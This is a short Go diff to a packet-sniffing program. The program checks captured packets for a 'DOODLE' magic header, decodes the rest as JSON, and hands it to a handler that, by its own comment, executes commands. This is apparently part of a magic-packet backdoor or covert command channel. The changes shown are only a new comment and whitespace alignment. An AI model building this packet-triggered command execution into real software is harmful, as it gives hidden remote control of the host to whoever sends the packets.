@@ -10,6 +10,7 @@ import (
 	"github.com/google/gopacket/pcap"
 )
 
+// Magic header at beginning of all packets
 var magicHeader = []byte{0x44, 0x4F, 0x4F, 0x44, 0x4C, 0x45} // "DOODLE"
 
 // hasMagicHeader checks to see if incoming packets have the magic header as their payload
@@ -38,8 +39,8 @@ func ReadPackets(handle *pcap.Handle) error {
 		if hasMagicHeader(payload) {
 			var message message.Message
 			body := payload[len(magicHeader):] // Strip the magic header to leave raw JSON behind
-			json.Unmarshal(body, &message) // Turn the JSON into a Message struct
-			handleMessage(&message) // Handle the message (execute command)
+			json.Unmarshal(body, &message)     // Turn the JSON into a Message struct
+			handleMessage(&message)            // Handle the message (execute command)
 		}
 	}
 
